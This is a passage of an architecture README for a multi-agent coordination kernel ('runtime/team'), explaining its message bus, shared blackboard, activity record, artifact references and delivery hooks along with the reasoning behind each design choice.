# runtime/team — Coordination Kernel

The in-process coordination kernel for the Digital Team feature. This module is
a peer of `runtime/im-channels`: pure runtime orchestration primitives. It owns
the **Message Bus** (Actor-model directed messaging), the **Blackboard** (shared
coordination facade over the team store), and the **team MCP tools** the digital
humans call.

The kernel primitives (`message-bus`, `blackboard`, `checks`, `team-tools`) do
NOT import the session layer (`app-chat`, `report-tool`). The session-integration files in
this same directory (`orchestration`, `index`, `team-prompt`, `lead`) provide the
`TeamDeliveryHooks` implementation, the epoch lifecycle, the prompt layers, and
the lead template, and wire the kernel to `app-chat` through injected deps — the
direction stays downward and the cycle is broken by the runtime accessor in
`index.ts` (mirrors `im-channels` `setActiveImChannelManager`, ARCHITECTURE §22.5).

## Layer position

```
runtime/team  (this module)
  ├── may import: apps/team (TeamStore), platform/scheduler (SchedulerService),
  │               services/agent/resolved-sdk (tool/createSdkMcpServer),
  │               http/websocket (broadcastToAll), foundation/window.service (sendToRenderer)
  └── MUST NOT import: app-chat.ts, orchestration.ts, report-tool.ts (the session layer)
```

The session layer depends downward on this module; this module never imports it.
The coupling is inverted through `TeamDeliveryHooks` (see "Integration seam").

## Files

- `message-bus.ts` — Registry/addressing, topology enforcement, the single
  per-session turn slot and the mailbox that queues behind it, turn-completion
  bookkeeping, per-epoch circuit breaker. Exports `createMessageBus(deps)` and
  the `TeamDeliveryHooks` / `TurnCompletion` contract the session layer
  implements.
- `blackboard.ts` — Scoped-write facade over `TeamStore` that emits
  `team:blackboard` after each write, plus `readBoard()` returning a
  `BlackboardSnapshot`. Roster live status is injected via `getMemberStatus`.
  Besides tasks and findings it owns `postActivity` — the office RECORD (see
  below). The agent-facing snapshot carries acts with their bodies stripped and
  only a recent tail (`SNAPSHOT_ACTIVITY_LIMIT`); the full rows are for the UI,
  which reads the store.

  The tail is a bound on ONE READ, never on what a member can learn — the tool
  layer says how many acts it is withholding and hands over a file holding all of
  them (`board-archive.ts`). Tasks and findings are NOT bounded and must not be:
  they are current state, and a member that cannot see an open task duplicates it.
- `board-render.ts` — the board as the agent reads it: markdown tables, not
  `JSON.stringify`. The JSON spent most of its budget on what the reader cannot
  use — every field name repeated per row, the team/epoch ids it asked with, the
  app ids behind names that every tool takes instead. Two rules keep the
  compression honest: nothing is truncated (long text is reflowed onto one line,
  a table cell holding no newline), and only unusable identifiers are dropped (a
  task id stays — `team_update_task` needs it verbatim; activity/finding row ids
  and app ids go). An empty section still prints with "None.", because a missing
  heading reads as "not included here", which is a different claim from "there is
  none". `renderActivityTable` is shared with the archive so a live row and an
  archived row cannot describe an act differently.
- `board-archive.ts` — the full record of one piece of work, exported on demand
  so the acts outside the window stay REACHABLE. Without it the tail was not
  merely unshown but unrecoverable: nothing pages backwards, and an act an agent
  cannot see is indistinguishable to it from one that never happened — the exact
  inference the board's own contract forbids ("what is on it is reliable"). A
  file, rather than a paging parameter, because the real question is "did anyone
  ever follow this up?", which is a grep; the agent's own file tools answer it
  better than any cursor we could design, and they need no protocol.

  It is a PRINTOUT, not a second ledger — the database is the record, this is
  regenerated from it and safe to delete at any moment. Hence: written only when
  something is actually withheld; rewritten only when the act count moved;
  **rebuilt whole, never appended** (acts replicate between machines and arrive
  out of order, so a late row can sort BEFORE rows already written and any
  offset-based delta would skip or duplicate one); carrying the same fields the
  snapshot carries, message bodies included in neither (this changes what an
  agent can reach, and must not quietly widen what it can see); and living in a
  scratch dir, since it is regenerable and its only reader is the agent that was
  just handed the path.

  That scratch dir is shared by every Halo instance on the machine — the
  decentralized test tier boots several, and a dev build sits beside an installed
  one — each holding its own replica of the SAME work. Two consequences, and
  neither is optional: the file name carries the writing instance (otherwise they
  overwrite each other's printout, and silently, since each remembers writing it
  and skips the rewrite — leaving a reader told "240 acts" holding someone else's
  210), and startup sweeps by AGE rather than wiping the directory (a blanket
  wipe would take a sibling's live file). The write itself is a rename over the
  printout, never a truncate-and-refill: the reader is a separate process and can
  open it at any moment, including while a concurrent turn triggers a rewrite,
  and half a record reads as "this never happened" — the one conclusion this file
  exists to prevent.
- `board-digest.ts` — what a member missed, rendered into the top of its turn.
  It answers exactly one question — what CHANGED on the board since this member
  last looked — as a delta against a per-member, in-memory watermark. The
  watermark advances to the newest act ACCOUNTED FOR, never to wall-clock, since
  two acts can share a millisecond and a clock-based mark would skip the second
  forever. The delta is RANKED, not cut off by recency: a message accepted for
  delivery to this member is dropped outright (it arrived as the input of a turn
  the member took, so digesting it quotes back the message being read right now),
  successful traffic between two OTHER members is folded to one line per pair, and
  the budget in between goes to the facts that reach the member nowhere else — a
  task moving, a run ending, a message that never arrived. A failure is never
  folded away. Rendered twice — into the envelope (`orchestration.withDigest`) and
  onto a `team_read_board` result — from one implementation, so the two can never
  drift.

  It carried a second half once — "your task is still pending", "you asked X and
  nothing has come back" — and that half is deliberately gone. Both were
  inferences from ABSENCE, which this record cannot support: it proves what was
  written down, never that something did not happen. The unanswered-message line
  was worse than merely weak: a SUCCESSFUL reply is a fresh `message` act with its
  own correlation id, never a `reply` act, so the only thing that could ever mark
  a message answered was one of the FAILURE fates (`recordReply`). The line was
  therefore true for every message that actually went through, for the life of the
  epoch, and silent for exactly the ones that had failed. In practice it pinned the
  oldest few sends to the top of every single turn, crowding out the delta it was
  printed beside. A per-turn line that is always true carries no information and
  trains the reader to skip the block, taking the real facts with it. If stalled
  work needs surfacing, it belongs to something whose job is judgment (a lead's
  sweep, a periodic check) — not to the delta.
- `turn-report.ts` — reports endings of explicit collaboration turns to the lead.
  Human conversations (including unspecified origins) produce no report. Every
  collaboration ending is reported regardless of who requested the work or whom
  the member messaged. Explicit messages do not replace lifecycle notifications.
  The report carries the observed fate, filed acts, a request excerpt (200 codepoints) and final reply
  excerpt (500 codepoints), never a full-session retrieval link or a completion
  claim. Errors remain visible; a manual stop must not be automatically restarted
  or reassigned. Endings go to the shared delivery core at once, one notice per
  permission standing for whatever piled up meanwhile; no ending supersedes
  another. Same-authority notices join a working lead; different-authority
  notices merge into a following turn. A lead on another machine gets a
  15-second coalescing window instead, because its busyness is not visible here
  and an older build runs each notice as a turn of its own. Completed tasks are
  checked before handoff and again before a deferred turn starts. Only failed
  handoffs have retry timers.
  An ending carries the origin of the turn it describes, and only a guest's
  travels on: a notice reporting what a guest's request produced wakes the lead
  as the guest's, for that one wake. A colleague's result is the lead's to weigh
  with the owner's reach, like any other content its own turn reads (see "Where a
  request came from"). A notice to a lead on another machine also carries its
  facts (`TeamTriggerContext.turnEnded`), so that machine renders the notice
  itself and reads it as its own runtime's — never a body written elsewhere.
- `checks.ts` — periodic checks: one member's standing instruction for another
  ("from now on, every half hour, look at this"). Two rules shape it: the alarm
  is armed only on the machine that OWNS the target (so the setter can shut their
  computer, and an away owner simply does not wake), and the row is office-shared
  through an injected `publish` seam (so every node's board shows the same list
  and any member — or the user — can stop one it did not set). A due RECURRING
  check reaches a working target through the same permission-aware gate as a
  teammate message. Repeated due events use the check id as a coalescing key,
  so waiting events retain the latest instruction. The injected `wake` returns
  the bus's `WakeDisposition`; accepted rounds update `runCount` and
  `lastRunAt`. A `once` check is retired after handoff — row dropped and delete
  replicated — because the accepted message is its continuing record. Retiring
  its alarm is left to the scheduler, which disables a one-shot job by itself:
  deleting a job from inside its own due handler pulls it out from under the run
  log written on the way out, so leftovers are swept at `rehydrate()`. Checks
  end with the epoch they were set inside.
  A check serves whose request its setter served: a remote creator's serves a
  colleague, and one set by a turn running restricted keeps that turn's origin.
  Only a row this machine wrote is trusted for its origin and its words; a row
  written elsewhere serves at least a colleague whatever creator it names, and
  an update of one written here only advances its rounds.
- `team-tools.ts` — `createTeamMcpServer(context)` building the `halo-team` MCP
  server with the team tools. Topology/unknown-member violations surface as
  error tool_results so the LLM sees them. A ref reaching `team_post_finding` or
  `team_update_task` is resolved through `artifact-path` BEFORE the board write
  and the whole call is refused when it does not resolve — publishing something
  unreadable used to succeed here and fail hours later on another machine, with
  the publisher sure it had shared the file and the reader sure it never
  arrived, neither holding enough of the truth to fix it.
  The same gate refuses a name **another member already published**
  (`blackboard.findPublishedRefConflict`). A ref is a path inside its
  publisher's own working directory, so two members reach for `report.md`
  independently; on the board those are one identical string, and every reader
  downstream then receives whichever row resolution picked — a wrong file that
  looks exactly like the right one. Publishing is the last instant the two are
  still tellable apart, and the member holding the file is standing right there,
  one rename away. Ownership is the ref's FUTURE owner, not the caller: a task's
  resultRef belongs to the assignee, so a lead attaching a member's own file to
  that member's task is not a collision. Republishing your own ref is an update.
  A `team:` ref carries its producer's folder and cannot collide this way; it
  still passes the check, which then costs nothing and guards the odd case.
- `artifact-path.ts` — what a published `ref` MEANS. Two forms: `team:<member
  folder>/<path>` names a file in the TEAM FOLDER of the piece of work (below);
  any other ref names a file inside the producing member's WORKING directory,
  stored relative to it. The rules earn their own module because publishing
  (`resolveArtifactRef`) and reading (`resolvePublishedRef`) must never disagree
  about them. First, the working-directory root is the directory the agent
  actually works in (`getSpaceDir`), never the space's internal bookkeeping path
  — for a space pointed at a project folder the two differ, and resolving
  against the wrong one makes every artifact unreadable while every
  default-space test stays green. Second, an absolute path INSIDE either root is
  folded back to its portable form rather than refused: the model sees absolute
  paths everywhere, and only the portable form survives the trip to a teammate
  whose copy sits elsewhere. The team folder is tested first — it is the
  narrower place, and a working directory as wide as the home folder would
  otherwise claim it. Third, a `team:` file publishes only from the sub-folder
  of the member that will OWN the ref — the caller's, or a task assignee's when
  a lead attaches that member's file to its task (`TeamFolders.ofTaskAssignee`,
  local assignees only) — so the ref always carries its real producer's name;
  reading accepts any sub-folder, because the board already says whose it is.
  But only a producer on this machine is served locally: a `team:` ref needs no
  working-directory lookup, so without that check a ref published in a remote
  member's name could reach a local member's unpublished file. A bare
  relative path the working directory lacks is also tried in the caller's own
  folder (models name team files that way as often as by ref); the working
  directory wins when it has the file. A `team:`
  ref is never tried as a project path (the colon cannot occur in a Windows file
  name). Symlinks are resolved before every containment test.
- `team-folder.ts` — where a collaboration's in-between output lives:
  `<haloDir>/team-work/<id>/<member folder>/` (root: `getTeamFolderRoot` in
  `foundation/config`, beside the other data-directory paths), `id` = the first 12 hex of
  sha256(teamId, epochId). A member's working directory is often the user's own
  repository, and reviews and reports left there were litter the user had to
  clean up. Models are told about it the way Claude Code tells them about its
  scratchpad — one line naming the member's own sub-folder as the "scratch
  folder" for temporary collaboration files, and one clause in the ref rule;
  the working directory stays THE working directory. Wherever no folder could
  be prepared, the prompt and every rejection message are byte-identical to the
  wording before the folder existed. The coordinating space conversation learns
  its path from the `collab_start` result, never from its system prompt, which
  was fixed before the collaboration existed. Per epoch because an epoch is one
  piece of work, and because published refs already resolve per (team, epoch);
  derived rather than stored so every machine of an office computes the same
  folder, and a `team:` ref travels to its owner unchanged. Under the Halo data
  directory, not the OS temp dir (shared by every Halo instance) and not a space
  (a team spans spaces; a remote member's machine has no copy of the owning
  one). Member folder names are file-system safe and unique within the team even
  case-insensitively (a later member whose name reduces to an earlier one's gets
  its app id appended). `forMember` creates the folder it hands out and answers
  null when it cannot — a member is never pointed at a folder it cannot write
  to. Folders outlive the epoch (the Team view still opens them, and a paused
  epoch reopens); they go when the team is dissolved (`TeamService`) and an idle
  startup task prunes those no local epoch accounts for, skipping any touched in
  the last hour (by the top-level folder's mtime, which moves when a member
  sub-folder is created — not on writes inside one) so a folder created ahead
  of its epoch row is never taken. The coordinating space conversation resolves
  its own folder once per epoch and caches it; a failed resolution is retried.
- `member-record.ts` — the location-transparent logic behind `team_read_member`,
  the LEAD's read of what a member said and was told in this run. Lines are the
  member's team-channel transcript numbered by `seq` (1-based ordinal — the same
  number the federation history plane uses, so a page cursor means the same on a
  local and a remote member). Local members come from the injected `readLocal`
  (`readTeamMemberMessages`, backed by the transcript parse cache); remote ones
  from `fetchMemberHistory`, an unreachable owner becoming an honest "unavailable"
  message, a replica served while the owner is down flagged stale. Pages run from
  the newest backwards under an 8000-character budget (`tailStartWithinBudget`, at
  least one message per page, a single oversized message cut with a note) and carry
  messages only — an assistant line says how many thinking/tool steps it took. The
  tool is registered only for a lead (member servers omit it; the space coordinator,
  always the lead, has it) and refuses in a turn running restricted for a request
  from outside: a raw record is the owner's reach, not a stranger's.
- `artifact-read.ts` — the location-transparent logic behind
  `team_read_artifact`. Resolves the producing member through the published-ref
  SSOT (`apps/team/artifact-refs`: a finding's ref OR a task's resultRef), then
  reads bytes locally (`createLocalArtifactResolver`, resolving through
  `artifact-path`, shared with the federation owner-serve path) or through the
  injected remote fetch. A `team:` ref resolves in the team folder with no
  lookup of the producer's working directory; any other ref through
  `createMemberWorkDirResolver`, which also knows the coordinating space
  conversation — a roster entry with a placeholder appId no app record carries,
  whose retained publications remain readable after its roster entry is removed.
  A former publisher's team-folder file is local only when its working directory
  still resolves on this machine; missing membership alone never establishes
  ownership, and a known remote member always stays remote.
  A ref claimed by two members resolves to `ambiguous`
  and is refused by name — the publish gate above makes that rare, but it cannot
  be made impossible (two nodes publishing at once each see a free name until
  replication catches up), and a guess here is undetectable to the model that
  receives it. Every successful read names its producer for the same reason: the
  reader asked for a name and must be able to see whose file that name opened.
  Applies a binary guard and a UTF-8-boundary-safe inline ceiling. Remote
  failures arrive as the typed `RemoteArtifactError` contract (bootstrap maps
  federation codes via `classifyArtifactFetchFailure`), so raw transport codes
  never reach the agent-facing message. No remote fetch injected → cross-machine
  reads report an honest "unavailable".

  The same file serves a PERSON clicking a shared file
  (`createTeamArtifactOpener`, reached through `TeamService.openArtifact` and
  the `team:open-artifact` IPC). It must stay on the reader's resolution — a
  ref that names one member's file for the agent and another's for the person
  is the worst kind of wrong — so both take the same `fetchRemote` from
  bootstrap and local paths from `createLocalArtifactPathResolver`. What it
  hands back is a path the OS can open: a same-machine file in place; a
  teammate's file fetched, size-capped (`MAX_OPEN_COPY_BYTES`) and written
  read-only under a per-(team, epoch, ref) directory in the OS temp dir, marked
  as downloaded on Windows, and flagged `revealOnly` when its extension is one
  the OS would execute — the renderer then shows it in its folder instead of
  opening it. Failures cross as a code (`TeamArtifactOpenFailure`) because the
  renderer writes the sentence. Stale copies are pruned by an idle startup task
  (`pruneSharedFileCopies`). Desktop only: the result is a local path, so remote
  clients download through the artifact route instead.

## Output is not delivery

**A member's own output reaches no teammate. Ever.** Speaking to a teammate is
an explicit `team_send`; the runtime forwards nothing on a member's behalf, not
even the last thing it writes, and not even to whoever started the turn.

This is forced, not stylistic. A member's team-channel session is **also where
its owner talks to it** — the same `conversationId` carries a person typing and
a teammate's envelope (see "Team as an IM backend" and `sendToMember`). One
window, two listeners, one output. Nothing in the system can tell which of them
a given sentence was meant for; only the model knows. The old design guessed
"the teammate" and wired the turn's final message straight into the sender's
mailbox, which produced exactly what a wrong guess produces:

- what a member said *to its owner* was mailed to a colleague;
- the colleague's own sign-off came straight back;
- both sides kept relaying each other's closing lines, carrying no new
  information, until the circuit breaker stopped them;
- and the target received two things per exchange — the message the model chose
  to send, plus the one the system added.

Explicit communication uses `team_send`. Sending a message or result to any
teammate does not suppress the independent ending notice to the lead. This holds
for work requested by the lead and for work requested by another member.

For explicit collaboration, the runtime may send bounded request/reply excerpts
with the observed fate. A lifecycle notice reaches the lead even when the
collaboration topology gives the lead no communication edge to the member;
coordination status is independent of permission to receive message content.
Excerpts and content-bearing act/error descriptions require both the executing
member and the original requester to be contactable by the lead. Structured
teams with an unknown requester therefore send status only. The check runs when
the notice is delivered, at the time each notice is handed to the mailbox.

This deliberately accepts a bounded duplicate of an explicitly sent result for
coordination context; it does not convert a final reply into another team message
or suppress any member-ending notice. The report explicitly says that excerpts
are not addressed to the lead and do not prove the requester received a reply.
They are neither instructions nor a claim that the task is complete. Human
conversations do not participate, and absent trigger origin defaults to human.
Only manual stops prohibit automatic restart or reassignment. No full
conversation-reading capability is introduced.

Two reporters, one notice, because no single point sees every ending. The
session layer reports every turn that actually RAN — the one place a person's
turn, a relayed turn and an IM-backed turn all converge, and the only place a
hand-stopped turn surfaces at all. Orchestration reports the two endings no turn
can report about itself: a wake that never became a turn, and a turn cut off at
the time limit. They overlap on purpose and de-duplicate on the wake's
correlation id, first one through winning — the timeout is reported *before* the
session is torn down precisely so the truer description wins that race.

**A turn is described only by the machine that ran it.** Otherwise a remote
member's ending is announced twice, once by its owner and once by whoever was
waiting for it. The exception is the pair above: nothing ran anywhere, so the
waiting side is the only witness there will ever be.

Each ending is handed to the delivery core immediately; endings that arrive
while a notice is going out ride the next one, every one of them kept (bounded
by the per-notice summary cap, whose overflow is counted in the notice). There
is no lead-busy probe; only a lead on another machine is paced, by the remote
coalescing window. The core merges compatible messages at live boundaries or in
the next safe turn. A failed handoff keeps its unsent facts ahead of later ones,
retries on a timer a bounded number of times (one log line per outage, no
activity row per attempt), then waits for the next ending to try again; already
accepted facts are never replayed by a partial retry. Task closure cancels
pending retries. The independent notice cap counts only notices that woke the
lead: a coordinating conversation reports whether a notice started a turn,
joined its running one or was queued; a remote lead's notice counts once.

A person stopping a member session (`holdSessionAfterStop`, called by app-chat's
stop path) voids their own 1:1 messages still waiting in the bus (kept in the
member's record, marked) and holds everything else for the session's next turn.
Deliveries the stopped turn accepted and never read come back through
`returnDeliveries` marked `inputRecorded`, so their records are not written again
when they are delivered. A woken turn the stop caught before the member read it —
while it waited for a concurrency slot, or while its session was being set up —
is not settled as undelivered: `returnHeldBack` hands the slot back, voids the
person's own words (receipt settled; written marked through `recordStoppedInputs`
when nothing was written yet) and returns the rest, whose waiting receipts read
`queued`. No turn-end report is made for it until it has actually run.

## The two channels (do not conflate)

- **Mailbox (directed)**: `team_send` drops an envelope into a target's mailbox
  and wakes its team-channel turn. The message becomes that turn's input. 1:1.
- **Blackboard (shared)**: tasks/findings/activity/roster the whole team reads via
  `team_read_board` and writes via scoped tools. No directed delivery.

**The board is not the source of truth, and nothing may treat it as one.** It is
a record of what was written down. What is on it is reliable; what is missing
from it proves nothing — a member can finish work and not record it. The truth
about delivery lives in the mailbox, which has a receipt; the truth about work
lives with whoever did it. Both the Entry prompt and the digest say so
explicitly, because the failure this cost us was an agent reasoning "the task is
still pending, therefore it was not done".

## The office record (`team_activity`)

State and history are different things, and the board only had state. Tasks keep
their latest status, findings are their own content — and directed messages had
no home at all: each one only passes through the sender's transcript (as a tool
argument) and the receiver's (as a turn input), on machines that may not even be
the same. Nowhere did "who contacted whom" exist as a fact.

`team_activity` is that record. Three properties shape it:

- **Append-only.** A `reply` act is a NEW row carrying the original's
  `correlationId`, never an edit of the message row — so replication is a single
  idempotent insert and a rejected shadow write rolls back to a plain delete.
  Note what this does NOT give you: a normal reply is not a `reply` act at all
  (next bullet), so the rows can tell you a message FAILED but never that one was
  answered. Do not build "is this still waiting?" on top of them.
- **A turn ending is not a reply** (`isRecordableFate`). `completeTurn` files a
  `reply` act only for the fates the sender cannot learn any other way — `error`,
  `timeout`, `undelivered` — because the member is not running and cannot report
  those itself. A turn that simply *ran* files nothing: its closing words went to
  whoever is watching that member's chat, and if they were meant for the sender
  they were sent with `team_send`, which files its own `message` act. Recording
  every turn end as a reply would quote the member's closing line back at the
  sender through the digest ("X answered you: …") — the same conflation as
  auto-delivery, moved into the record.
- **Recorded where the system already knows.** Messages and failed fates are
  recorded by the BUS (`send`, `completeTurn`, `resolvePendingWaitsForMember`)
  because that is the one point every teammate message path converges — a
  member's `team_send`, an escalation routed to the lead. Board acts are recorded
  by the tool layer. Neither depends on an agent choosing to keep a log.
- **Only digital humans act.** The record is what the digital humans did among
  themselves; a person's words are never on it. The bus keys this on
  `fromAppId === null` (see below), and `PostActivityInput.actorAppId` is
  non-nullable so the rule cannot be broken by accident: there is no way to
  file an act with no actor.
- **Content, not sentences.** A row stores the task title / message first line in
  `subject` plus the kind; the renderer composes the localized sentence and the
  digest composes an agent-facing one. Full message text is kept in `body` and is
  never put in a snapshot or a digest.

Reads (`team_read_board`, `team_read_artifact`) are deliberately NOT recorded:
they change nothing, they are frequent, and they would push the acts that matter
off the feed. "Who has seen what" is the digest's watermark, not a row.

**A bounded read must say that it is bounded.** The record outgrows any window
worth putting in a turn, so the snapshot carries a recent tail — but a cut that is
silent AND unrecoverable is not a cheaper read, it is a false one: it hands the
agent a fragment shaped exactly like the whole, and the board's own contract
("what is on it is reliable") stops holding for the one reader that cannot open
the UI. So the two go together and neither ships without the other: the read
states the total and the number withheld, and `board-archive.ts` puts all of them
in a file the agent can read and grep. The UI is unaffected — it reads the store
directly and always showed everything.

Office-shared: it rides the same single-writer replication plane as tasks and
findings (`ReplicationOp: 'post_activity'`), because a shared conversation record
that is only true on one machine is worse than none.

## A space conversation can be the coordinator (`space-coordinator.ts`)

An ephemeral space collaboration has no lead app: the space agent itself
coordinates, and the roster row it occupies carries a SENTINEL appId
(`spaceCoordinatorAppId`). That sentinel keeps every name-addressed mechanism
working unchanged — `team_send coordinator` resolves through the member row,
topology and the circuit budget charge normally, the activity record and the
turn-end report route to "the lead" — while delivery diverges at exactly one
point: `bus.deliver` detects the sentinel and hands the envelope to the
injected `deliverToCoordinator` hook instead of the turn gate.

Why the gate is bypassed whole rather than adapted: the gate's slot is repaid
only by `completeTurn`, and no space turn ever reports back through this bus —
a reserved slot would sit until the TTL watchdog on every single message. The
space conversation has its own exclusivity domain (conversation-interop's turn
gate: start when idle, join matching-authority work, defer other identities), and two queues for one
conversation would be one queue too many. For the same reason a receipted send
to the coordinator settles on hand-over (`status: 'ok'`), never waits.

`space-coordinator.ts` renders what the space agent reads — a member's message
gets provenance framing ("a teammate is reporting to you, not your user");
system wakes (`member_stopped`, `periodic_check`) pass verbatim, they carry
their own headers — and drops deliveries for a sealed collaboration with a log
instead of an error, because the sender's turn already happened. The sealed
check runs once, at hand-over: a message accepted while the collaboration was
open is still delivered even if `completeCollab` lands while it waits behind a
busy coordinator turn. Acceptance is the contract — a member's report that made
it in before completion is context the coordinator should see, not stale
traffic, and re-checking at drain would make delivery depend on how long the
coordinator's queue happened to be. What the
transcript keeps is the RAW body plus metadata (`source: 'team-message'`), so
the renderer shows a teammate chip, never a fake user bubble. The conversation
side of the hook is injected by bootstrap (`deliverToSpaceCoordinator` →
conversation-interop `deliverExternalMessage`); this module never imports the
conversation layer.

The space agent's own tools are the same `team-tools` builders with a per-call
context resolver (`ResolveTeamMcpContext`): a space conversation's toolset is
seeded before any collaboration exists, so the tools look the current
collaboration up at call time — `collab_start` and the first `team_send` work
inside one turn, with no session rebuild between them.

## A person is not a member (`fromAppId === null`)

A person's 1:1 message to a member travels this same bus — that is how it
reaches a member owned by another machine — but it is **not team traffic**.
`SendInput.fromAppId` is null for it, and that one fact gates all three forms of
team bookkeeping: no act on the record, no circuit charge, no `team:message`
flow signal. The bus delivers, and does nothing else.

Three reasons, and the first is the one that matters:

- **A chat is not the office's business.** Everyone talks to their own digital
  human freely. Putting those words on a shared board turns a working tool into
  a room being watched, and pushes them into every OTHER member's digest —
  people who were never part of that conversation. What the office should see is
  what the digital humans DO: the tasks they hand out, the results they file.
  How a person phrased the request is the member's input, not the team's record.
- **Attribution must be true.** A person has no member identity, so a recorded
  act had to borrow one (it borrowed the lead's). That put words in the mouth of
  a digital human that never ran — visible to everyone, and fed back to the lead
  itself as "you asked X and got no answer" about a question it never asked.
- **The budget guards AI loops.** The circuit breaker exists to stop digital
  humans ping-ponging without supervision. A person cannot loop: every message
  costs them a keystroke. Charging one only let a chat eat into the run's
  message allowance for free.

This is also what makes remote match local: a local 1:1 chat never touched the
bus at all (`app-chat` runs the turn directly), so the record stayed clean —
only the remote path, which needs the bus to cross machines, was filing acts.

`TeamTriggerContext` carries the same distinction in two fields, because they
answer different questions: `fromAppId` is WHO acted (identity — what the record
and the budget key on), and `kind` is HOW the turn should read (`'human_message'`
delivers a person's words verbatim, with no `[Team message from …]` framing
impersonating a teammate). A person's send has `fromAppId: null` and
`kind: 'human_message'`; a run start has `fromAppId: null` and no person behind
it, which is why one flag could not carry both.

## Integration seam — `TeamDeliveryHooks`

The bus cannot import the session layer, so waking a target and observing
business state is injected. The session layer implements:

```ts
interface TeamDeliveryHooks {
  wakeTarget(params: {
    sessionKey, appId, teamId, epochId, envelope, trigger
  }): Promise<void>          // resolves when the woken turn STARTS being processed
  isBusy(sessionKey: string): boolean
  deliverMidTurn?(params: { ...the same params }): boolean  // see below
}
```

`wakeTarget` injects the envelope as a team-channel turn with the trigger
context. Its returned promise is NOT the turn outcome — the outcome is reported
back asynchronously through `bus.completeTurn(...)` when the turn ends (any of
the four §5.6 exits). This keeps every sender non-blocking: `send` hands over and
returns, and whether an answer ever comes is up to the target's `team_send`.

**`isBusy` must be answered by the layer that actually runs the turn, and for a
team turn that is app chat's consumer model** (`isAppChatConversationGenerating`)
— never the engine's legacy `activeSessions` map, which app chat does not write.
Asking that map returned `false` for every team session that has ever run, and
nothing failed loudly: the gate's reservation still queued mail correctly, so
what disappeared was everything the probe exists FOR — mid-turn delivery refusing
on "no turn is streaming", quiescence counting a streaming member as idle, and
the slot watchdog willing to reclaim a session mid-stream (the one thing it
promises never to do). A probe that is always false is worse than no probe: every
caller reads a confident answer and none of them can tell it is a constant.

`isBusy` lets the bus decide buffer-vs-deliver: if the target session is
mid-turn — or a turn is already IN FLIGHT for it (the busy probe only turns
true once the session layer registers the turn, so the bus reserves the key
synchronously at dispatch to keep two racing deliveries from running two
concurrent turns on one session) — the envelope goes INTO that turn when
`deliverMidTurn` can take it, and otherwise is enqueued in its mailbox and
drained when the current turn completes (mirrors `dispatch-inbound`
supplement-buffering).

`deliverMidTurn` hands the envelope to the turn the member is already running
(see "Reaching a member that is already working"). It starts no turn and
completes nothing; the gate decides when it is allowed to be called at all
(`platform/turn-gate` §8), and a false answer falls straight back to the
mailbox.

Mailbox liveness has four triggers, because a team session also runs turns the
bus never sees (a human 1:1 chat with a member uses the same session key):
1. `completeTurn` — after every BUS-driven turn (the primary path);
2. the session layer's turn-end nudge — app-chat calls `bus.drainMailbox` when
   ANY team-session turn ends, so mail buffered behind a human turn is not
   stranded until the next bus turn (which may never come);
3. a per-session recheck timer armed at buffering — covers the race where the
   target went idle between the busy probe and the buffer push. It re-arms while
   the target is still busy and stops once the mailbox is empty, so mail behind a
   turn that hangs for minutes is not held hostage to that turn ending.

4. `notifySessionReady` — session startup completed, so compatible waiting mail
   joins immediately without waiting for its first ending.

None of these can free a slot: they all drain, and a drain refuses a session
that still reads occupied. The slot itself is freed only by `completeTurn`, so a
completion that never happens locks the session — see "A stuck slot must be
recoverable, and must never read as idle" below.

## Bus public API

`createMessageBus({ store, hooks, circuitOverrides? }) → MessageBus`

- `send(input) → Promise<TeamSendAsyncResult | TeamSendSyncResult>`
  Resolves member name→appId, enforces topology, and — for a teammate send only
  (`fromAppId !== null`, see "A person is not a member") — bumps circuit
  counters, records the act and emits `team:message`. Then builds the
  `TeamEnvelope`, hands it to the gate, and resolves with `{ messageId }` plus a
  `delivery` receipt: absent when handed over now, `'mid_turn'` when it went into
  the turn the target was already running, `'queued'` when it is waiting behind
  that turn, `'undelivered'` when its owner was unreachable at send time. Since
  nothing is ever delivered back, this receipt is everything the sender learns —
  which is why "queued" is worth saying: a lead that knows the target is busy can
  pick someone else. It is accurate for a locally-owned target; a remote one
  queues on its OWNER, invisible from here, and reads as a plain hand-over.
  Throws `TopologyError` / `UnknownMemberError` / `CircuitBreakerError` (the tool
  layer converts these to error tool_results).
  `input.wait` asks for a completion receipt instead, and **no agent can set
  it** — `team_send` has no such parameter. Its one caller is
  `teamService.sendToMember`, a PERSON's cross-machine 1:1 chat, whose UI must
  distinguish "sent" from "never arrived". Even then the receipt is a status; the
  person reads the member's actual reply in the transcript.

  **A receipted send that only reaches the mailbox answers `'queued'`
  immediately.** A receipt is settled by a COMPLETION, and a queued message has
  not started the turn that will complete — so waiting for one meant waiting for
  a turn this message did not cause, i.e. until the receipt ceiling, two hours
  away. What the caller saw in the meantime was nothing at all: the HTTP request
  hung, no act was recorded (a person's send files none), the words were not in
  the transcript (an envelope is rendered at dispatch, not at enqueue), and the
  member read as idle. That is a send which looks successful and is not, and it
  is strictly more dangerous than one that fails loudly — it is what makes an
  operator conclude the session is dead and open a second one beside it, which
  is how one lead ended up dispatching twice into one workspace. The message is
  still delivered when the current turn ends; the caller simply learns that now.
- `deliverRuntimeWake({ envelope, trigger, onBusy }) → Promise<WakeDisposition>`
  A turn the RUNTIME asked for, not a member's `team_send`: the escalation
  resume, the quiescence nudge, a due periodic check. No delivery receipt, no
  circuit charge — but the SAME busy gate as `send`, because the bus is the only
  component that knows a session already has a turn running or one in flight.
  A path that calls `wakeTarget` directly starts a second concurrent turn on one
  session key, and the loser's subprocess is torn down mid-stream.
  `onBusy: 'buffer'` means permission-aware live delivery, with a merged
  following turn when authority differs or the engine cannot accept it.
  Recurring checks use `coalescingKey: check:<id>`; they are never skipped
  merely because a member is working. `skip` is reserved for whole-run restarts.
- `notifySessionReady(sessionKey)`
  Rechecks waiting messages when a held turn becomes live. The sender does not
  have to wait for that turn to finish before compatible mail can land.
- `runRelayedTurn({ sessionKey, run }) → Promise<T>`
  An explicit exclusive callback barrier retained for non-message callers.
  Federation message delivery now uses app-chat's permission-aware admission.
- `completeTurn({ sessionKey, trigger, outcome, sealPending? })`
  Called by the session layer when a woken team turn ends. It **delivers
  nothing** (see "Output is not delivery"). It releases the session's slot,
  records the outcome if it is a failure worth recording (see the office record),
  resolves a completion receipt if a non-agent caller is holding one, and drains
  the mailbox for that `sessionKey`.

  **`sealPending` is the caller saying "I am about to seal this epoch", and it
  suppresses the drain and nothing else.** The epoch-sealed guard above cannot
  cover this: it asks whether the epoch is sealed *now*, and a deferred seal
  (the lead called `team_complete`, so the seal waits for its turn to end) fires
  in the caller's very next statement. In between, the drain handed a queued
  envelope a turn — which the seal then tore down while it was still building
  its session. That produced neither of the two endings this design allows: not
